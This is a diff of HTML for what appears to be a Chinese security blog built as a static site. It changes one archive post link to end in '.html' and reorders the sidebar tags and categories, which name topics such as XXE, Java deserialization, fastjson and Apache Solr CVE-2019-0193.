         <li class="archive-post-item">
-            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/posts/1899165956/" >BCH分叉-重放攻击解决方案</a>
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/posts/1899165956.html" >BCH分叉-重放攻击解决方案</a>
         </li>
     
     </div>
@@ -926,15 +977,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="常规渗透"><span class="iconfont-archer">&#xe606;</span>常规渗透</span>
     
+        <span class="sidebar-tag-name" data-tags="浏览器安全策略"><span class="iconfont-archer">&#xe606;</span>浏览器安全策略</span>
+    
         <span class="sidebar-tag-name" data-tags="内网渗透"><span class="iconfont-archer">&#xe606;</span>内网渗透</span>
     
         <span class="sidebar-tag-name" data-tags="计划任务"><span class="iconfont-archer">&#xe606;</span>计划任务</span>
     
-        <span class="sidebar-tag-name" data-tags="浏览器安全策略"><span class="iconfont-archer">&#xe606;</span>浏览器安全策略</span>
-    
         <span class="sidebar-tag-name" data-tags="移动端"><span class="iconfont-archer">&#xe606;</span>移动端</span>
     
         <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE 实例利用"><span class="iconfont-archer">&#xe606;</span>XXE 实例利用</span>
     
         <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
@@ -942,19 +995,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="java反序列化"><span class="iconfont-archer">&#xe606;</span>java反序列化</span>
     
-        <span class="sidebar-tag-name" data-tags="java sql注入"><span class="iconfont-archer">&#xe606;</span>java sql注入</span>
+        <span class="sidebar-tag-name" data-tags="jackson"><span class="iconfont-archer">&#xe606;</span>jackson</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞学习"><span class="iconfont-archer">&#xe606;</span>漏洞学习</span>
+    
+        <span class="sidebar-tag-name" data-tags="java sql注入"><span class="iconfont-archer">&#xe606;</span>java sql注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="Apache Solr CVE-2019-0193"><span class="iconfont-archer">&#xe606;</span>Apache Solr CVE-2019-0193</span>
     
         <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
     
         <span class="sidebar-tag-name" data-tags="java反弹shell"><span class="iconfont-archer">&#xe606;</span>java反弹shell</span>
-    
-        <span class="sidebar-tag-name" data-tags="Apache Solr CVE-2019-0193"><span class="iconfont-archer">&#xe606;</span>Apache Solr CVE-2019-0193</span>
-    
-        <span class="sidebar-tag-name" data-tags="jackson"><span class="iconfont-archer">&#xe606;</span>jackson</span>
-    
-        <span class="sidebar-tag-name" data-tags="XXE 实例利用"><span class="iconfont-archer">&#xe606;</span>XXE 实例利用</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -995,17 +1046,17 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Web渗透"><span class="iconfont-archer">&#xe60a;</span>Web渗透</span>
     
-        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
-    
         <span class="sidebar-category-name" data-categories="浏览器安全策略"><span class="iconfont-archer">&#xe60a;</span>浏览器安全策略</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
         <span class="sidebar-category-name" data-categories="Web安全/XSS"><span class="iconfont-archer">&#xe60a;</span>Web安全/XSS</span>
     
         <span class="sidebar-category-name" data-categories="Web渗透/常规渗透"><span class="iconfont-archer">&#xe60a;</span>Web渗透/常规渗透</span>
     
-        <span class="sidebar-category-name" data-categories="内网渗透/计划任务"><span class="iconfont-archer">&#xe60a;</span>内网渗透/计划任务</span>
-    
         <span class="sidebar-category-name" data-categories="浏览器安全策略/csp"><span class="iconfont-archer">&#xe60a;</span>浏览器安全策略/csp</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透/计划任务"><span class="iconfont-archer">&#xe60a;</span>内网渗透/计划任务</span>
     
         <span class="sidebar-category-name" data-categories="Web渗透/安全策略"><span class="iconfont-archer">&#xe60a;</span>Web渗透/安全策略</span>
     
@@ -1021,13 +1072,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/Apache-Solr-CVE-2019-0193</span>
     
-        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java-sql注入"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java-sql注入</span>
-    
         <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/jackson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/jackson</span>
     
         <span class="sidebar-category-name" data-categories="web-渗透/漏洞学习/fastjson"><span class="iconfont-archer">&#xe60a;</span>web-渗透/漏洞学习/fastjson</span>
     
         <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java反弹shell"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java反弹shell</span>
+    
+        <span class="sidebar-category-name" data-categories="web-渗透/java反序列化/java-sql注入"><span class="iconfont-archer">&#xe60a;</span>web-渗透/java反序列化/java-sql注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
